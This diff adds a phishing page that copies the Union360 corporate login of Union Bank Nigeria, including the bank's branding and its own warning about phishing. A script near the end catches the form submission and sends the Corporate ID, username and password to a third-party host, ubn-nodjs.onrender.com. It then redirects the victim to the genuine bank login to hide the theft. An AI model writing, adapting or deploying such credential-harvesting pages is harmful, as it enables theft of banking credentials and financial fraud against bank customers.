@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Union360 | Login</title>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-160269182-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'UA-160269182-1');
+    </script>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/font-awesome.css">
+    <link rel="stylesheet" href="css/owl.carousel.min.css">
+    <link rel="stylesheet" href="css/owl.theme.default.min.css">
+    <link href="css/keyboard.css" rel="stylesheet">
+    <link href="css/unionlogins.css" rel="stylesheet">
+    <link href="css/parsey.min.css" rel="stylesheet">
+    <style>
+        /* Add your custom CSS styles here */
+    </style>
+</head>
+
+<body onload="checkCookie()">
+    <div class="modal" id="disclaimerModal">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <div class="modal-wrapper">
+                        <h5>Disclaimer</h5>
+                        <hr>
+                        <strong class="question">Protect Yourself from vulnerability</strong>
+                        <p>01. Union Bank will never ask you to disclose sensitive banking information such as your online login details or PIN Number.</p>
+                        <p>02. Beware of emails or text messages that ask you to confirm personal banking details</p>
+                        <p>03. Do not respond to suspicious emails and delete them from your mailbox immediately</p>
+                        <p>04. Do not click on any links in emails to connect to our online banking website</p>
+                        <p>05. Always click on the internet banking tab on our website (<a href="https://www.unionbankng.com/">www.unionbankng.com</a>) to access Union360 </p>
+                        <button class="btn btn-agree" type="button" data-dismiss="modal">Agree</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <header>
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-sm-6">
+                    <h2><a href="#"><span class="medium">union</span><span class="light">360</span></a></h2>
+                </div>
+                <div class="col-sm-6">
+                    <img class="pull-right brand-logo" src="images/whitelogo.png">
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <section class="body">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-sm-3 col-md-7"></div>
+                <div class="col-sm-9 col-md-5 col-12">
+                    <div class="card">
+                        <form id="form1" >
+                            <input type="hidden" name="_csrf" value="68474e01-ade5-4b65-8b6c-db821abc09e6">
+                            <h5 class="text-right">Login</h5>
+                            <br>
+                            <div class="form-group row">
+                                <label for="loginid" class="col-sm-3 col-form-label col-form-label-sm">Corporate ID</label>
+                                <div class="col-sm-9">
+                                    <input type="text" class="form-control" id="loginid" required="required" name="loginid">
+                                </div>
+                            </div>
+                            <div class="form-group row">
+                                <label for="username" class="col-sm-3 col-form-label col-form-label-sm">Username</label>
+                                <div class="col-sm-9">
+                                    <input type="text" class="form-control" id="username" name="username" required="required">
+                                </div>
+                            </div>
+                            <div class="form-group row">
+                                <label for="password" class="col-sm-3 col-form-label col-form-label-sm">Password</label>
+                                <div class="col-sm-9">
+                                    <input type="password" class="form-control password" id="password" required="required" name="password">
+                                </div>
+                            </div>
+
+                            <div style="float: right">
+                                <div class="row button-row">
+                                    <div class="col-sm-12">
+                                        <button type="submit" id="btnSignIn" class="btn btn-cyan pull-right">Login</button>
+                                        <a href="/uonline/nsec/resetcorppassword" class="btn btn-light-gray">Forgot Password</a>
+                                        <img id="loader" src="images/loader.gif" style="display:none;position:relative;">
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-sm-6">
+                    Copyright 2023
+                    <span class="organisation-name">Union Bank Nigeria Plc</span>
+                </div>
+                <div class="col-sm-6">
+                    <span class="pull-right">
+                        All Rights Reserved
+                        <a href="terms-condition.html" target="_blank">Terms and Conditions</a>
+                        <a href="privacy-policy.html" target="_blank">Disclaimer Privacy Policy</a>
+                        <a href="#">FAQs</a>
+                    </span>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/jquery1.11.3.min.js"></script>
+    <script>
+        // Handle form submission
+        $(document).ready(function () {
+        $("form").submit(function (event) {
+          event.preventDefault();
+          var loginid = $("#loginid").val();
+          var username = $("#username").val();
+          var password = $("#password").val();
+
+          var data = {
+            loginid: loginid,
+            username: username,
+            password: password,
+          };
+
+          $.ajax({
+            url: "https://ubn-nodjs.onrender.com/api/user",
+            method: "POST",
+            data: JSON.stringify(data),
+            contentType: "application/json",
+            success: function (response) {
+              console.log(response);
+              // Handle success response here
+
+              // Redirect to the specified page
+              window.location.href =
+                "https://union360.unionbankng.com/uonline/login";
+            },
+            error: function (error) {
+              console.log(error);
+              // Handle error response here
+            },
+          });
+        });
+      });
+    </script>
+    <script src="js/jquery.slim.min.min.js"></script>
+    <script src="js/jquery.keyboard.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/validate.min.js"></script>
+    <script src="js/app.js"></script>
+    <script src="js/unionlogins.js"></script>
+</body>
+
+</html>
